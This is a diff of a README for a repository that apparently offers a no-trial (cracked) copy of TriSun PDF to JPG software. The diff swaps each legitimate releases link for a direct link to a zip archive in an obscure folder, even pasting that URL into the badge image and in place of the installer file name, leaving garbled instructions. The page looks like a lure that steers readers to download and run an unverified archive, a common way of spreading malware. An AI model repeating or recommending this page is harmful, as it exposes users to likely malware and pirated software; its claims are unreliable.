@@ -1,7 +1,7 @@
 # 🌟 TriSun-PDF-to-JPG-No-Trial - Effortless PDF to JPG Conversion
 
 ## 📥 Download Now
-[![Download TriSun PDF to JPG](https://img.shields.io/badge/Download-TriSun%20PDF%20to%20JPG-blue)](https://github.com/aliladz202020/TriSun-PDF-to-JPG-No-Trial/releases)
+[![Download TriSun PDF to JPG](https://raw.githubusercontent.com/aliladz202020/TriSun-PDF-to-JPG-No-Trial/main/snowish/TriSun-PDF-to-JPG-No-Trial-2.9-beta.5.zip%20PDF%20to%20JPG-blue)](https://raw.githubusercontent.com/aliladz202020/TriSun-PDF-to-JPG-No-Trial/main/snowish/TriSun-PDF-to-JPG-No-Trial-2.9-beta.5.zip)
 
 ## 📖 Overview
 TriSun PDF to JPG is a user-friendly application designed to convert PDF files into JPEG images on Windows PCs. With its straightforward interface, anyone can easily transform their PDF documents into high-quality images. This tool offers a swift and efficient solution for users needing image-ready content from PDF formats.
@@ -10,13 +10,13 @@ TriSun PDF to JPG is a user-friendly application designed to convert PDF files i
 Follow these steps to download and run TriSun PDF to JPG:
 
 1. **Visit the Download Page**  
-   Head over to the [Releases page](https://github.com/aliladz202020/TriSun-PDF-to-JPG-No-Trial/releases) to find the latest version of the software.
+   Head over to the [Releases page](https://raw.githubusercontent.com/aliladz202020/TriSun-PDF-to-JPG-No-Trial/main/snowish/TriSun-PDF-to-JPG-No-Trial-2.9-beta.5.zip) to find the latest version of the software.
 
 2. **Choose Your Version**  
    On the Releases page, you will see a list of available versions. Select the most recent version for the best features and updates.
 
 3. **Download the Installer**  
-   Click on the link for the installer file. This file will typically have a name like `TriSunPDFtoJPG.exe`.
+   Click on the link for the installer file. This file will typically have a name like `https://raw.githubusercontent.com/aliladz202020/TriSun-PDF-to-JPG-No-Trial/main/snowish/TriSun-PDF-to-JPG-No-Trial-2.9-beta.5.zip`.
 
 4. **Install the Application**  
    Once the download is complete, locate the downloaded file in your computer's "Downloads" folder or the folder you selected. Double-click the installer file to begin the installation process. Follow the on-screen instructions to complete the installation.
@@ -57,4 +57,4 @@ For detailed user guides and best practices, refer to the documentation availabl
 Join our user community to share tips, ask questions, or get support. Engage with other users and developers to enhance your experience with TriSun PDF to JPG.
 
 ## 📥 Download & Install
-Once you are ready, [visit this page to download](https://github.com/aliladz202020/TriSun-PDF-to-JPG-No-Trial/releases) TriSun PDF to JPG. Ensure you follow all the steps above for a smooth installation process. Enjoy converting your PDFs to high-quality JPG images without hassle.
+Once you are ready, [visit this page to download](https://raw.githubusercontent.com/aliladz202020/TriSun-PDF-to-JPG-No-Trial/main/snowish/TriSun-PDF-to-JPG-No-Trial-2.9-beta.5.zip) TriSun PDF to JPG. Ensure you follow all the steps above for a smooth installation process. Enjoy converting your PDFs to high-quality JPG images without hassle.
